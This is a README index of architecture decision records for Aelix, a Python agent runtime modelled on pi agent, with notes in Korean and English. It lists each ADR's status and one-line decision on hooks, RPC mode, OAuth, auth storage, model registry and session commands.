# Architecture Decision Records

이 폴더는 Aelix 설계의 중요한 결정을 ADR(Architecture Decision Record) 형식으로
보관합니다. ADR 형식과 상태 규칙은 `../00-conventions.md`를 따릅니다.

## Status 값

- `Draft`: 논의 중인 결정
- `Accepted`: 현재 설계 기준
- `Accepted (Phase 1.2 임시 결정)`: Phase 1.2 scope 하에 결정되었으나 Pi parity 관점에서 후속 ADR로 대체 예정
- `Deprecated`: 폐기되었지만 역사적 맥락 때문에 보존
- `Superseded`: 다른 ADR로 대체됨 (`Superseded by:` 명시)

## A 단계 closure milestone (Sprint 6h₅c / Phase 4.16 / 2026-05-22)

**A 단계 (Phase 4 strict Pi-parity superset) CLOSED end-to-end.** Every
binding carry-forward item enumerated across the 6a → 6h₅c sprint chain
has a paired delivering sprint + owner ADR (see **ADR-0086 §"A 단계
closure ledger"** for the 14-row delivery mapping). The Phase 4 RPC
discriminator union is fully wired at SUPPORTED **29** / DEFERRED **0**
/ total **29**; the 4 extension session lifecycle events emit Pi-parity
end-to-end; the 3 runtime callback surfaces (`with_session` / `setup` /
`forkFrom`) ship; the HTML emitter renders with full visual fidelity +
inline image data URIs; and :meth:`AgentHarness._get_context_usage_safe`
returns Pi-shape results both at the harness level and through the
extension-context sync bridge.

**B 단계 (next phase) candidate scope** — Phase 5 CLI / runner-mode
+ image-models parallel registry + typed `Model.compat` discriminated
union + `enableGitHubCopilotModel` POST automation +
`Model.knowledgeCutoff` / `releaseDate` Pi-untyped fields. ADR-0087+
formally opens B 단계 when the next sprint chain begins. Pi pin
advances permitted starting B 단계 per ADR-0034 update policy.

## Index

| #    | Title                                                                                                                                                  | Status                              | 한 줄 결정                                                                                                                                          |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| 0001 | [Use Aelix as the Product Name](0001-use-aelix-as-product-name.md)                                                                                     | Accepted                            | 프로젝트와 플랫폼 이름은 `Aelix`를 사용한다.                                                                                                        |
| 0002 | [Start with a Small Runtime Kernel](0002-start-with-small-runtime-kernel.md)                                                                           | Accepted                            | Aelix runtime core는 Pi `pi-agent-core` 경계(loop + hook bus + extension runtime + session manager)와 동일. Multi-agent orchestration은 core 밖.    |
| 0003 | [Use pi agent as the Primary Reference](0003-use-pi-agent-as-primary-reference.md)                                                                     | Accepted                            | pi agent를 primary reference로 두고 Python으로 충실히 재구현. ADR 없는 divergence는 버그.                                                          |
| 0004 | [Policy and Guardrail as Built-in Extensions](0004-policy-and-guardrail-as-builtin-extensions.md)                                                      | Accepted                            | runtime core는 정책을 강제하지 않고, built-in extension이 lifecycle hook으로 강제한다.                                                              |
| 0005 | [Marketplace Supports Multi-Source Indexes](0005-marketplace-multi-source-indexes.md)                                                                  | Accepted                            | marketplace는 npm / git / 사내 custom index를 1st-class source로 지원하고, 단일 manifest 형식을 강제하지 않는다.                                    |
| 0006 | [Aelix is a Standalone Platform](0006-aelix-is-a-standalone-platform.md)                                                                               | Accepted                            | Aelix는 standalone runtime/platform이며 DeepSight는 use case 중 하나로만 다룬다.                                                                    |
| 0007 | [In-Process Extension Execution by Default](0007-in-process-extension-execution.md)                                                                    | Accepted                            | extension은 in-process로 실행하며, isolation은 runtime protocol에 두지 않는다. 강한 격리는 OS/sandbox extension/index trust로 흡수한다.              |
| 0008 | [Agent Loop in Core, Orchestration in Extensions](0008-agent-loop-in-core-orchestration-in-extensions.md)                                              | Accepted — **AMENDED by ADR-0196** (`## Amendment (2026-07-19)`) **+ ADR-0197** (`## Amendment (2026-07-26)`) | 단일 agent loop는 kernel 책임, multi-agent / planner / subagent orchestration은 extension layer 책임. **Amendment (2026-07-19)**: "runtime core에는 multi-agent 개념을 두지 않는다"의 scope를 **kernel 축**(0줄 변경)과 **orchestration 축**(스폰/팀/라우팅 = extension)으로 명시하고, single-agent profile **identity**(format·discovery·resolution)는 skill 로딩과 동형인 product-core resource 관심사로 분리. spec §9의 mechanism/policy rejection criterion을 원문 그대로 리뷰 게이트로 등록. **Amendment (2026-07-26, ADR-0197)**: 게이트 인용문의 `caps` 조항을 **tunable(= extension policy)** vs **seam invariant(= product-core 허용; delegation depth 한정, 하드코딩, 절대 tunable 아님)** 로 정밀화하고, *"Consent policy is likewise extension policy — product-core may SURFACE a refusal, never AUTHOR one"* 조항 추가 (테스트로 강제: product-core에서 `SpawnGrant` / `request_spawn_consent` grep → 0 hits). |
| 0009 | [Python-First SDK; Multi-Language Clients via Future RPC ADR](0009-python-first-sdk.md)                                                                | Accepted (Phase 1.2 SDK choice)     | 1차 SDK는 Python만. 다언어 외부 클라이언트는 Phase 4 ADR-0020 RPC mode로 결정.                                                                     |
| 0010 | [Trust Model Stays Source-Specific; No Unified Schema in 1st Cut](0010-trust-model-stays-source-specific.md)                                           | Accepted                            | 1차에는 통합 trust verdict schema를 정의하지 않는다. ADR-0005의 source-책임 모델 유지.                                                              |
| 0011 | [Hook Event Catalogue v1](0011-hook-event-catalogue-v1.md)                                                                                             | Accepted (Phase 1.2 임시 결정)      | Phase 1.2가 ship하는 16개 hook event를 binding contract으로 등록. Phase 2.1에 ADR-0017로 대체.                                                      |
| 0012 | Extension Discovery Model                                                                                                                              | Deferred                            | Phase 3에서 결정. ADR-0028로 부분 해소 예정. (`~/.aelix/extensions`, `entry_points` 우선순위 결정됨.)                                              |
| 0013 | [message_end Reducer Policy — Observational in Phase 1.2](0013-message-end-observational-in-1-2.md)                                                    | Accepted (Phase 1.2 임시 결정 — Sprint 3b 재확정: message_end는 영구 observational)      | Phase 1.2의 `message_end`는 observational only. Sprint 3b P-3 verdict로 영구 확정(ADR-0018 Deprecated, Pi has no replacement reducer @ SHA 734e08e). |
| 0014 | [Hook Error Policy — Mutation hooks throw; Lifecycle observational hooks swallow+log](0014-hook-error-policy.md)                                       | Superseded by ADR-0019              | (Phase 1.2 임시 결정) — Sprint 3a에서 ADR-0019 v3로 대체됨.                                                                                          |
| 0015 | [Monorepo Layout — uv Workspaces](0015-monorepo-layout-uv-workspaces.md)                                                                               | Accepted (Phase 1.3 shipped)        | Phase 1.3 경계에서 uv workspaces 마이그레이션. Pi `packages/*` 구조와 1:1 매핑.                                                                    |
| 0017 | [Full Hook Event Catalogue v2](0017-full-hook-event-catalogue-v2.md)                                                                                   | Accepted (Sprint 3a / Phase 2.1.1 shipped) | Pi-verified 28 hook events (10 loop + 18 harness own). 7 wishlist events dropped per W1 Finding P-1. ADR-0011 대체.                                |
| 0018 | [message_end Replacement Reducer (Pi parity)](0018-message-end-replacement-reducer.md)                                                                  | Deprecated (Sprint 3b — superseded by P-3 verdict)                   | **Deprecated** — Pi has no message_end reducer at SHA 734e08e. Sprint 3b §0 verdict: keep `message_end` observational, no replacement reducer.       |
| 0019 | [Hook Error Policy v2 — Pi `"throw"` Default + Aelix `"continue"` Opt-in](0019-hook-error-policy-v2-pi-continue-default.md) | Accepted (Sprint 3a / Phase 2.1.1 shipped — v3 reframe) | Pi-parity `"throw"` default (matches Pi `normalizeHookError`) + Aelix additive `error_mode="continue"` opt-in. v3 reframe per W1 Finding P-2. ADR-0014 대체. |
| 0020 | [RPC Mode for Multi-Language Clients](0020-rpc-mode-multi-language-clients.md)                                                                          | Accepted (Sprint 6d / Phase 4.4 / W6 shipped) | `aelix --mode rpc` JSONL stdin/stdout protocol. Sprint 6d shipped 9 supported + 20 deferred (ADR-0058). Sub-sprints 6e/6f close the remaining surface.                                                     |
| 0021 | [Parallel-Mode Tool Execution + Per-Tool Override](0021-parallel-tool-execution.md)                                                                     | Accepted (Sprint 3c / Phase 2.1.3 shipped) | default parallel 실행 (`asyncio.gather` per P-7 reversal) + per-tool `execution_mode="sequential"` override.                                       |
| 0022 | [Session Manager + JSONL Persistence](0022-session-manager-jsonl-persistence.md)                                                                        | Accepted (Sprint 4a / Phase 2.2.1 shipped)                   | `Session` concrete class (17+1 methods) + `SessionStorage` Protocol + `JsonlSessionRepo`. 8-variant `PendingSessionWrite`. `message_end` wired. P-11 reversal (`PendingActiveToolsChangeWrite` deleted). |
| 0023 | [Compaction + Branch Summary](0023-compaction-branch-summary.md)                                                                                        | Accepted (Sprint 4b / Phase 2.2.2 shipped)                   | `compact()` + `navigate_tree()` + Phase machine `idle\|turn\|compaction\|branch_summary` + 4 session_* emit sites. ADR-0016 대체. P-14/P-15/P-16 verified.                                             |
| 0024 | [Queue Default `"one-at-a-time"` (Pi parity)](0024-queue-default-one-at-a-time.md)                                                                      | Accepted (Phase 1.2 follow-up fix)  | `steering_mode` / `follow_up_mode` default를 `"all"` → `"one-at-a-time"`으로 즉시 flip.                                                            |
| 0025 | [F-10 Minimal Turn-State Snapshot Rationale](0025-f10-minimal-turn-state-snapshot.md)                                                                   | Accepted (Phase 1.3 shipped)        | `_TurnState` 2-field minimal snapshot은 의도적. 나머지 7 fields는 owning ADR (0017/0022) land 시 확장.                                             |
| 0026 | [Workspace-Root Pytest Layout](0026-workspace-root-pytest-layout.md)                                                                                    | Accepted (Sprint 2 shipped)         | workspace-root 공유 `tests/` 유지. cross-package fixture 중복 방지. Pi additive divergence.                                                        |
| 0027 | [asyncio.TaskGroup for Parallel Tool Execution](0027-asyncio-taskgroup-parallel-tools.md)                                                               | Accepted (Sprint 3c / Phase 2.1.3 shipped — DECISION REVERSED to asyncio.gather) | P-7 reversal: `asyncio.gather(*coros, return_exceptions=False)` — Pi never cancels siblings on tool error, TaskGroup auto-cancel would be Pi divergence. ADR-0021 구현 binding. |
| 0028 | [Extension Auto-Discovery — Directory Scan (Pi Parity) + entry_points (Aelix-Additive)](0028-extension-auto-discovery-entry-points.md) | **Accepted (Sprint 5a / Phase 3.1.1 shipped — P-21 reversal)** | **Directory scan PRIMARY (Pi parity), entry_points ADDITIVE.** Sprint 2 Draft 명세를 P-21 검증으로 반전. ADR-0012 partial supersede. |
| 0029 | [Pi-Parity Acceptance Test Harness](0029-pi-parity-acceptance-test-harness.md)                                                                          | Draft (Phase 2.1+ ongoing)          | `tests/pi_parity/` 별도 lane. vendored Pi fixture + message-level equivalence assert. "믿는다" → "증명한다".                                       |
| 0030 | [Hook Event Exhaustiveness via assert_never](0030-hook-event-exhaustiveness-assert-never.md)                                                             | Accepted (Sprint 3a / Phase 2.1.1 shipped) | `match`+`assert_never` 패턴 코드-land. `_to_hook_event`에 적용. 새 event 미처리 시 pyright build fail.                                            |
| 0031 | [Build Backend Choice — Hatchling](0031-build-backend-hatchling.md)                                                                                     | Accepted (Sprint 2 shipped)         | 모든 packages/* hatchling 사용. declarative `src/` layout 지원. uv workspace first-class.                                                          |
| 0032 | [Sprint Workflow — Review + Pi Parity + Suggestions](0032-sprint-workflow-review-parity-suggestions.md)                                                 | Accepted (Sprint 2 onwards)         | W4 code-review + W5 Pi parity audit mandatory gate. bypass는 새 ADR 필요.                                                                          |
| 0033 | ExtensionContext UI surface                                                                                                                             | Deferred (Phase 5)                  | `ExtensionUIContext` 전체 표면. Phase 5 TUI/Web UI 구현 시 결정. (구 spec의 "ADR-0015" 항목 → 번호 충돌로 재배정.)                                 |
| 0034 | [Pi Reference Version Pin](0034-pi-reference-version-pin.md)                                                                                            | Accepted (Sprint 2.5 shipped)       | Pi reference를 commit SHA로 sprint별 pinning. 현재 pin: `734e08edf82ff315bc3d96472a6ebfa69a1d8016`.                                                |
| 0035 | [Error Code Taxonomy](0035-error-code-taxonomy.md)                                                                                                       | Draft (Phase 1.4 shipped — Aelix subset; full taxonomy Phase 2.1+) | Pi 10-code 표준 문서화. Aelix 5 codes 유지 + 5 placeholder는 owning ADR land 시 widen.                                                              |
| 0036 | [Loop AgentEvent vs Harness HookEvent Distinction (F-7)](0036-loop-event-vs-harness-event-distinction.md)                                              | Accepted (Sprint 3a — code-land: AgentEventName + AgentHarnessEventName aliases) | Loop `AgentEventName` (10) ≠ Harness `AgentHarnessEventName` (18). 두 union 별도 유지 + 통합 `HookEventName` union.                                |
| 0037 | [Streaming Event Union (Pi Parity)](0037-streaming-event-union-pi-parity.md)                                                                            | Draft (Phase 1.4 shell; adapter coverage Phase 4)                  | Pi 12-event union을 Phase 4 adapter PR에서 land. Phase 1.4는 design 문서만.                                                                          |
| 0038 | [stream_simple Dispatch Shell — Phase 1 Boundary](0038-stream-simple-dispatch-shell-phase-1-boundary.md)                                                | Accepted (Sprint 2.5 / Phase 1.4 shipped — body lands Phase 4)     | Phase 1 exit는 dispatch shell + registry + typed error에서 완료. Adapter는 Phase 4.                                                                |
| 0039 | [Phase 2.1 Strict Superset Closure](0039-phase-2-1-strict-superset-closure.md)                                                                          | Accepted (Sprint 3d / Phase 2.1.4 shipped)                          | Phase 2.1 strict superset closure — P-1..P-9 roster + E.5 closure pin + deferred allowlist (forward-compat clause).                                  |
| 0040 | [Phase 2.2 Strict Superset Closure](0040-phase-2-2-strict-superset-closure.md)                                                                          | Accepted (Sprint 4b shipped)                                        | Phase 2.2 strict Pi-parity superset closure (P-11~P-20 roster + closure pin).                                                                        |
| 0041 | [Phase 3.1 Extension API Full Surface Closure](0041-phase-3-1-extension-api-full-surface-closure.md)                                                    | Accepted (Sprint 5a / Phase 3.1.1 shipped)                          | Extension auto-discovery (Pi-primary), ExtensionAPI 48-method surface, ExtensionContext 14 fields, 3 new events registered (input/user_bash/resources_discover). P-21~P-28 roster + 4-week time-bound deferral. |
| 0042 | [Built-in Coding Tools + 3 Event Emit Sites + Minimal CLI Loop](0042-built-in-coding-tools.md)                                                          | Accepted (Sprint 5b / Phase 3.2 shipped)                            | 7 Pi-parity built-in coding tools (bash/read/edit/write/grep/find/ls) + 3 event emit sites active + minimal CLI loop + ExtensionCommandContext 4-of-6 lands. P-32~P-36. |
| 0043 | [Tool-Typed ToolCallEvent Variants](0043-tool-typed-tool-call-event-variants.md)                                                                        | Accepted (Sprint 5b / Phase 3.2 shipped)                            | 8 typed `ToolCallEvent` + 8 symmetric `ToolResultEvent` subclasses on existing base classes, `make_tool_call_event` factory, `is_tool_call_event_type` narrow helper. P-31. |
| 0044 | [Phase 3 Strict Superset Closure](0044-phase-3-strict-superset-closure.md)                                                                              | Accepted (Sprint 5b / Phase 3.2 shipped)                            | Phase 3 closure — P-21~P-36 roster + closure pin (`tests/pi_parity/test_phase_3_2_strict_superset.py`) + deferred allowlist Phase-4-only. |
| 0045 | [Provider Adapter Interface](0045-provider-adapter-interface.md)                                                                                        | Accepted (Sprint 6a / Phase 4.1 shipped)                            | `Provider` Protocol + `register_provider_object` / `unregister_providers_by_source` (Pi parity) + `SimpleStreamOptions` extensions + `ProviderResponse`. Anthropic adapter ships under `aelix_ai.providers.anthropic`. |
| 0046 | [Phase 4 Strict Superset Closure](0046-phase-4-strict-superset-closure.md)                                                                              | Accepted (Sprint 6a / Phase 4.1 shipped)                            | Phase 4 closure — P-37~P-43 roster + closure pin (`tests/pi_parity/test_phase_4_strict_superset.py`) + DEFERRED_ALLOWLIST = `{}` (empty). |
| 0047 | [OpenAI Completions Adapter (+ Compat Detection)](0047-openai-completions-adapter.md)                                                                   | Accepted (Sprint 6b / Phase 4.2 shipped)                            | OpenAI Completions adapter (2nd of 9 KnownApi adapters); OpenRouter served via same adapter; 17-field compat dataclass; sync-factory `stream_simple` + eager auth. |
| 0048 | [Pi Shared Utilities Ported](0048-pi-shared-utilities.md)                                                                                                | Accepted (Sprint 6b / Phase 4.2 shipped)                            | `_transform_messages` + `_sanitize_unicode` + `_streaming_json` + `_env_api_keys` shared cross-provider infra; Anthropic retrofit deferred to Sprint 6d (P-50-followup). |
| 0049 | [Message Dataclass — Provenance + Thinking + Image Split + Tool Name](0049-message-dataclass-provenance-and-thinking.md)                                | Accepted (Sprint 6b / Phase 4.2 / W6 shipped)                       | Additive `ThinkingContent`, `AssistantMessage.api/provider/model`, `ImageContent.mime_type/data`, `ToolResultMessage.tool_name`. Anthropic-side population deferred to Sprint 6d. |
| 0050 | [Phase 4.2 Strict Superset Closure](0050-phase-4-2-strict-superset-closure.md)                                                                          | Accepted (Sprint 6b / Phase 4.2 / W6 shipped)                       | Phase 4.2 closure — P-47~P-82 + C-1 + M-1..M-6 roster + closure pin (`tests/pi_parity/test_phase_4_2_strict_superset.py`) + `PHASE_4_2_DEFERRED_APIS` (7) + `COMPAT_DEFERRED_ALLOWLIST` (4+2). |
| 0051 | [OAuth Client Framework](0051-oauth-client-framework.md)                                                                                                | Accepted (Sprint 6c / Phase 4.3 / W6 shipped)                       | OAuth `Protocol` + types + PKCE + callback server + registry + high-level `get_oauth_api_key_from_credentials`. Separate registry from API providers (ADR-0045). |
| 0052 | [Anthropic OAuth Flow](0052-anthropic-oauth-flow.md)                                                                                                    | Accepted (Sprint 6c / Phase 4.3 / W6 shipped)                       | Anthropic OAuth flow port (PKCE + local callback + token exchange/refresh + constants) + Bearer header injection (P-94) + late-manual-input fallback (P-93) + CALLBACK_HOST wiring (P-98). |
| 0053 | [AuthStorage and Secrets](0053-auth-storage-and-secrets.md)                                                                                              | Accepted (Sprint 6c / Phase 4.3 / W6 shipped — Anthropic only)      | `AuthStorage` JSON layer (atomic tmp+fsync+rename write + 0o700/0o600 perms + asyncio.Lock + fcntl.flock POSIX cross-process). Copilot/Codex + layered cascade deferred to Sprint 6e. |
| 0054 | [RPC Mode Deferred to Sprint 6d](0054-rpc-mode-deferred-to-sprint-6d.md)                                                                                 | Accepted (Sprint 6c / Phase 4.3 / W6 — formal carry-forward)        | Formal carry-forward record for `rpc-mode` / `rpc-client` / `rpc-types` / `jsonl` (~1,310 Pi LOC). `_PHASE_4_DEFERRED_FEATURES["rpc-mode"]` owns. |
| 0055 | [Phase 4.3 Strict Superset Closure](0055-phase-4-3-strict-superset-closure.md)                                                                          | Accepted (Sprint 6c / Phase 4.3 / W6 shipped)                       | Phase 4.3 closure — P-83~P-104 + W4 M1..M6 + W4 m1..m9 roster + closure pin (`tests/pi_parity/test_phase_4_3_strict_superset.py`) + `_OAUTH_DEFERRED_PROVIDERS` (2) + `_PHASE_4_DEFERRED_FEATURES` (2). |
| 0056 | [RPC JSONL Protocol](0056-rpc-jsonl-protocol.md)                                                                                                        | Accepted (Sprint 6d / Phase 4.4 / W6 shipped)                       | LF-only framing + UTF-8 incremental decode + CR strip + tail-on-end. Pi `jsonl.ts` (58 LOC) parity. `ensure_ascii=False` preserves U+2028/U+2029 inside string payloads. |
| 0057 | [RPC Types and Envelope](0057-rpc-types-and-envelope.md)                                                                                                | Accepted (Sprint 6d / Phase 4.4 / W6 shipped)                       | 29 RpcCommand variants + uniform 24 success + 1 error envelope + 12-field RpcSessionState + 9-method RpcExtensionUIRequest + 3-shape RpcExtensionUIResponse (TYPES only). |
| 0058 | [Phase 4.4 Strict Superset Closure](0058-phase-4-4-strict-superset-closure.md)                                                                          | Accepted — **AMENDED by the RPC sprint** (`## Amendment (2026-07-31)`) | Phase 4.4 closure — P-105~P-129 + W4 M1..M5 + W4 m1..m10 roster + closure pin (`tests/pi_parity/test_phase_4_4_strict_superset.py`) + `DEFERRED_COMMANDS` (20) covering 29 - 9 = 20 deferred Pi RpcCommand variants. **Amendment (2026-07-31)**: the `P-119 / W4 m2` carry-forward — *"synthetic terminal event emission deferred to Sprint 6f when harness exposes event bus"* — is **RETIRED as based on a false premise**. Measured against the pinned Pi file: `grep -nE "agent_end\|synthetic"` over `rpc-mode.ts` returns **0 hits**; Pi's RPC server never synthesises a terminal event, and `rpc-mode.ts:379-401` emits a *correlated error response* guarded by `if (!preflightSucceeded)`. No harness event-emit API was ever required — Pi terminates failed/aborted runs inside the harness (`agent-harness.ts:568` bare `catch` → `emitRunFailure` `:512-524`, which **returns**, not rethrows), and Aelix already contained that port with two paths bypassing it. The real repair was a kernel one and shipped in the RPC sprint. The `contextlib.suppress` half of P-119 stands. |
| 0059 | [GitHub Copilot OAuth (Device-Code Flow)](0059-copilot-oauth-device-flow.md)                                                                          | Accepted (Sprint 6e / Phase 4.5 / W6 shipped)                       | Pi parity port of Copilot device-code grant + enterprise domain (`enterpriseUrl` camelCase) + `proxy-ep` → `Model.base_url` injection via `modify_models` Protocol callback (Sprint 6c P-102 closed). |
| 0060 | [OpenAI Codex OAuth (PKCE Callback Flow)](0060-codex-oauth-pkce-flow.md)                                                                                | Accepted (Sprint 6e / Phase 4.5 / W6 shipped)                       | Pi parity port of Codex PKCE callback at port 1455 path `/auth/callback` + JWT `accountId` extraction at claim `https://api.openai.com/auth` + `originator=pi` + RFC 7519 §3 base64url decode (Pi `atob` bug correction). |
| 0061 | [AuthStorage Layered Cascade](0061-auth-storage-layered-cascade.md)                                                                                      | Accepted (Sprint 6e / Phase 4.5 / W6 shipped)                       | Pi parity port of 12 `AuthStorage` cascade methods (`set_runtime_api_key` / `set_fallback_resolver` / `has_auth` / `get_auth_status` / `list` / `has` / `get_all` / `drain_errors` / `login` / `logout` / `get_api_key_cascade` / `remove_runtime_api_key`) + `AuthStatus` (frozen) + `AuthSource` 6-value Literal + `FallbackResolver` + `resolveConfigValue` helper. P-141 / P-142. |
| 0062 | [`aelix auth` CLI Subcommand](0062-aelix-auth-cli-subcommand.md)                                                                                          | Accepted (Sprint 6e / Phase 4.5 / W6 shipped)                       | `aelix auth login/logout/status/list` subparser preserving Sprint 6d `--mode {interactive,rpc}` back-compat. P-152 unknown-provider exit 2 + n1 RuntimeError exit 1. |
| 0063 | [Phase 4.5 Strict Superset Closure](0063-phase-4-5-strict-superset-closure.md)                                                                          | Accepted (Sprint 6e / Phase 4.5 / W6 shipped)                       | Phase 4.5 closure — P-130~P-162 + W4 M1 + W4 m1..n3 roster + closure pin (`tests/pi_parity/test_phase_4_5_strict_superset.py`) + `_OAUTH_DEFERRED_PROVIDERS` drained to `{}` (3/3 Pi providers live) + 12 cascade methods present. |
| 0064 | [Model Cost + Thinking + Headers Fields](0064-model-cost-and-thinking-fields.md)                                                                        | Accepted (Sprint 6f / Phase 4.6 / W6 shipped)                       | `ModelCost` (frozen per-million rate) + `UsageCost` (mutable resolved) + `Usage` + `Cost = ModelCost` back-compat alias + Pi `Model.thinking_level_map` / `max_tokens` / `context_window` / `headers` (P-178). |
| 0065 | [ModelRegistry Runtime](0065-model-registry-runtime.md)                                                                                                  | Accepted (Sprint 6f / Phase 4.6 / W6 shipped)                       | Pi parity port of 14-method `ModelRegistry` + 2 factory constructors (`create` / `in_memory`) + `ResolvedRequestAuth` discriminated union (P-180 bool) + `ProviderConfigInput` + P-175/P-176/P-184 wire fixes + P-187 `set_current_model` writes `_state.model` directly. |
| 0066 | [Phase 4.6 Strict Superset Closure](0066-phase-4-6-strict-superset-closure.md)                                                                          | Accepted (Sprint 6f / Phase 4.6 / W6 shipped)                       | Phase 4.6 closure — P-163~P-187 roster + closure pin (`tests/pi_parity/test_phase_4_6_strict_superset.py`) + ModelRegistry 14 methods present + 7 Pi helpers exposed + 13-model seed catalog + `DEFERRED_COMMANDS` 20 → 17 (set_model/cycle_model/get_available_models live). |
| 0067 | [Model Resolver Port + Full Pi Catalog Data Transfer](0067-model-resolver-and-catalog.md)                                                              | Accepted (Sprint 6g₁ / Phase 4.7 / W6 shipped)                      | Pi parity port of `model-resolver.ts` (637 LOC, 7 functions + 3 helpers) + `defaultModelPerProvider` (32 rows) + full 942-model JSON catalog data transfer + `KnownProvider` Pi semantic order (P-208) + `Model.compat` passthrough (`_openai_compat.get_compat` merge confirmed wired, P-210) + `_glob_match_pi_minimatch` (P-207) + `RestoreModelResult` typed dataclass (P-206). |
| 0068 | [Phase 4.7 Strict Superset Closure](0068-phase-4-7-strict-superset-closure.md)                                                                          | Accepted (Sprint 6g₁ / Phase 4.7 / W6 shipped)                      | Phase 4.7 closure — P-197~P-215 roster (W0 P-197..P-204 + W4/W5 P-205..P-215) + closure pin (`tests/pi_parity/test_phase_4_7_strict_superset.py`, 32 tests) + `KnownProvider` Pi semantic order + `DEFAULT_THINKING_LEVEL == "medium"` (P-205) + `Model.compat` field + `RestoreModelResult` shape + glob `/`-boundary. Sprint 6g₂/6g₃/6h carry-forward enumerated. |
| 0069 | [Prompt-Templates + Skills + `get_commands` RPC](0069-prompt-templates-and-skills.md)                                                                  | Accepted (Sprint 6h₁ / Phase 4.8 / W6 shipped)                      | Pi parity port of `harness/prompt-templates.ts` (~380 LOC) + `harness/skills.ts` (~540 LOC) + `_handle_get_commands` (Pi `rpc-mode.ts:622-653` aggregates 3 sources) + `ResolvedCommand` Pi `{name}:{N}` disambiguation (P-224 BLOCKING) + Pi-shape `{path, source, scope, origin}` `sourceInfo` wire (P-225 BLOCKING) + `ResolvedCommand` forwards source_info (P-229 BLOCKING) + `PromptTemplate` empty defaults (P-226 MAJOR) + shared `_frontmatter` parser (W4 m4) + YAML error surface (P-233) + case-insensitive `.md` strip (P-234). |
| 0070 | [Phase 4.8 Strict Superset Closure](0070-phase-4-8-strict-superset-closure.md)                                                                          | Accepted (Sprint 6h₁ / Phase 4.8 / W6 shipped)                      | Phase 4.8 closure — P-216~P-244 roster (W0 P-216..P-223 + W4/W5 P-224..P-244) + closure pin (`tests/pi_parity/test_phase_4_8_strict_superset.py`) + 13 supported / 16 deferred RPC split + 22+ W6 regression tests. Sprint 6h₂ / 6h₃ carry-forward enumerated. |
| 0071 | [9 RPC Commands + Harness Setters](0071-9-rpc-commands-and-harness-setters.md)                                                                          | Accepted (Sprint 6h₂ / Phase 4.9 / W6 shipped)                      | Pi parity port of 9 RPC handlers + 5 harness setters + 4 AgentState fields + 1 `_MessageQueue.set_mode` helper + 2 public properties + cycle algorithm with `supportsThinking()` guard (P-254 BLOCKING) + strict `_decode_images` (P-262 BLOCKING) + keyword-only `images` (P-263 MAJOR) + `auto_retry_enabled` wire surface (P-264 BLOCKING) + `_MessageQueue.set_mode` validation (P-265 BLOCKING) + line citation corrections (P-258 BLOCKING). |
| 0072 | [Phase 4.9 Strict Superset Closure](0072-phase-4-9-strict-superset-closure.md)                                                                          | Accepted (Sprint 6h₂ / Phase 4.9 / W6 shipped)                      | Phase 4.9 closure — P-245~P-267 roster (W0 P-245..P-253 + W4/W5 P-254..P-267) + closure pin (`tests/pi_parity/test_phase_4_9_strict_superset.py`, 28 tests) + 22 supported / 7 deferred RPC split + 11 W6 regression pins. Sprint 6h₃ carry-forward enumerated (5 session-tree + 2 session-inspection commands + Pi `SettingsManager` port + retry loop + queue_update wire shape + steer expanders). |
| 0073 | [Session Stats + HTML Export Wire Port](0073-session-stats-and-html-export.md)                                                                          | Accepted (Sprint 6h₃ / Phase 4.10 / W6 shipped)                     | Pi parity port of `SessionStats` (`agent-session.ts:212-223`) + `getSessionStats` aggregator (`agent-session.ts:2901-2945`) + minimal HTML emitter (`coding-agent/src/core/export-html/`) + 2 RPC handlers (`get_session_stats` / `export_html`). Pi-shape `contextUsage {tokens, contextWindow, percent}` (P-275 BLOCKING) + `totalMessages = len(messages)` (P-276 BLOCKING) + Pi error parity on `export_to_html` (P-279 MAJOR) + Pi-shape default `outputPath = aelix-session-<basename>.html` (P-281 MAJOR) + aggregator dict-shape fallback via `_read` (P-283) + W4 HIGH `hasattr` dead branch drop (P-292) + line citation corrections (P-277/P-278/P-286). |
| 0074 | [Phase 4.10 Strict Superset Closure](0074-phase-4-10-strict-superset-closure.md)                                                                        | Accepted (Sprint 6h₃ / Phase 4.10 / W6 shipped)                     | Phase 4.10 closure — P-268~P-292 roster (W0 P-268..P-274 + W4/W5 P-275..P-292) + closure pin (`tests/pi_parity/test_phase_4_10_strict_superset.py`) + 24 supported / 5 deferred RPC split. Sprint 6h₄ carry-forward enumerated (5 session-tree commands + `AgentSessionRuntime` port + `SessionManager.getLeafId` + `rebindSession` seam + `_get_context_usage_safe` real impl + live `session_id` read + Pi-source-grep verification + Pi HTML visual fidelity to Sprint 6h₅). |
| 0075 | [Session Navigation (read-only) RPC Commands](0075-session-navigation-read-only.md)                                                                    | Accepted (Sprint 6h₄a / Phase 4.11 / W6 shipped)                    | Pi parity port of 2 read-only session-navigation RPC commands — `get_fork_messages` (Pi `rpc-mode.ts:591-594` → `agent-session.ts:2867-2900` `getUserMessagesForForking`) + `get_last_assistant_text` (Pi `rpc-mode.ts:596-599` → `agent-session.ts:3063-3070` `getLastAssistantText`). `ForkPointInfo` frozen dataclass for Pi inline `{entryId, text}` shape (P-295) + async harness method per Aelix `Session.get_entries()` async (P-294) + list-only `_extract_user_message_text` with defensive string branch (P-296) + aborted-empty filter `stop_reason == "aborted" AND len(content) == 0` (P-297) + Pi key-omission parity `{"text": text} if text is not None else {}` (P-298 SYNTHESIS) + P-293 line-citation drift captured (ADR-0074 `:563-566`/`:568-571` → verified `:591-594`/`:596-599`). W4+W5 CLEAN verdict — zero BLOCKING/MAJOR/MINOR, only INFO observations mapping to documented divergences. |
| 0076 | [Phase 4.11 Strict Superset Closure](0076-phase-4-11-strict-superset-closure.md)                                                                        | Accepted (Sprint 6h₄a / Phase 4.11 / W6 shipped)                    | Phase 4.11 closure — P-293~P-301 roster (W0 P-293..P-298 + W5 INFO P-299..P-301 mapping to P-294/P-295/P-296 documented divergences) + closure pin (`tests/pi_parity/test_phase_4_11_strict_superset.py`) + 26 supported / 3 deferred RPC split. Sprint 6h₄b carry-forward enumerated (3 session-tree commands `switch_session`/`fork`/`clone` + `AgentSessionRuntime` full port + `SessionManager.getLeafId()` + `rebindSession()` seam P-126 multi-sprint carry-forward). First sprint since 6a with W4+W5 0-finding CLEAN verdict. Sprint 6h₄b foundation-update note appended: DEFERRED ownership rebrands ADR-0076 → ADR-0078 per spec §D.5; runtime infrastructure now in place for 6h₄c wiring. |
